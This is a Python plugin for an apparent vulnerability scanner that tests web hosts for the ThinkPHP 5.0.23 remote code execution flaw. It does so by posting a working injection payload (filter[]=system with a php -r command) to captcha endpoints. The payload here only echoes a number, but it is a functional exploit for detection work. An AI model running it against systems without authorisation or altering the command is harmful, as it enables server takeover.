#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'thinkphp5023_rce'
        self.info = "Check the ThinkPHP 5.0.*(tested on 5.0.23) RCE"
        self.keyword = ['all', 'thinkphp', 'tp', 'rce', 'web', 'danger']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        random_num = ''.join(str(i) for i in random.sample(range(0,9),4))
        check_num = int(random_num) * 4
        poc_data = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=php -r 'echo %s*4;'"%(random_num)
        url1 = "http://%s:%d/index.php?s=captcha"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/index.php?s=captcha"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/index.php?s=captcha"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/index.php?s=captcha"%(ip, int(port), add_web_path)
        url3 = "http://%s:%d/public/index.php?s=captcha"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/public/index.php?s=captcha"%(ip, int(port), add_web_path)
        url4 = "https://%s:%d/public/index.php?s=captcha"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/public/index.php?s=captcha"%(ip, int(port), add_web_path)
        for url in (url1, url2, url3, url4):
            try:
                req = Requester(url, method="post", data=poc_data, noencode=True)
                if str(check_num) in req.html:
                    result = "exists ThinkPHP 5.0.*(tested on 5.0.23) RCE, check url: %s"%(url)
                    self._output(ip, port, result)
                    return
            except:
                pass

globals()['VulnChecker'] = VulnChecker